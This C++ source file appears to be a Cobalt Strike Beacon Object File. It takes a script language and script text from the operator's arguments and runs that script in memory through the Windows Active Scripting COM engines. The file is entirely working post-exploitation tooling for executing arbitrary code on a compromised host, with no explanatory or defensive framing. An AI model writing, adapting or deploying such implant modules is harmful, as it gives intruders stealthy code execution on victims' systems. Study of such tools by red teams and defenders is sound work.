#include <general.h>
#include <activescript.h>

extern "C" auto go( char* args, int argc ) -> VOID {
    datap data_parser = {};

    GUID xCLSID_StdComponentCategoriesMgr = {0x0002E005, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

    BeaconDataParse( &data_parser, args, argc );

    WCHAR* target_script_lang = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    INT32  script_content_len = 0;
    WCHAR* script_content     = (WCHAR*)BeaconDataExtract( &data_parser, &script_content_len );

    RunScript( target_script_lang, script_content );

    return;
}

void RunScript( WCHAR* target_language, WCHAR* ScriptContent ) {
    MyActiveScriptSite* mActiveScript = new MyActiveScriptSite();
    IActiveScriptParse* ActiveParse   = nullptr;
    IActiveScript*      ActiveEng     = nullptr; 

    IID xIID_IActiveScriptSite = {0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

    CLSID   language_id = { 0 };
    HRESULT result      = S_OK;

    result = CLSIDFromProgID( target_language, &language_id );
    if ( FAILED( result ) ) return;

    CoInitializeEx( nullptr, COINIT_MULTITHREADED );

    result = CoCreateInstance( 
        language_id, 0, CLSCTX_INPROC_SERVER,
        IID_IActiveScript, (PVOID*)&ActiveEng
    );
    if ( FAILED( result ) ) return;

    result = ActiveEng->QueryInterface( 
        IID_IActiveScriptParse, (PVOID*)&ActiveParse 
    );
    if ( FAILED( result ) ) return;

    ActiveParse->InitNew();

    ActiveEng->SetScriptSite( mActiveScript );

    result = ActiveParse->ParseScriptText( 
        ScriptContent, nullptr, nullptr, 
        nullptr, 0, 0, 0, nullptr, nullptr
    );
    if ( FAILED( result ) ) return;

    ActiveEng->SetScriptState( SCRIPTSTATE_CONNECTED );

    return;
}
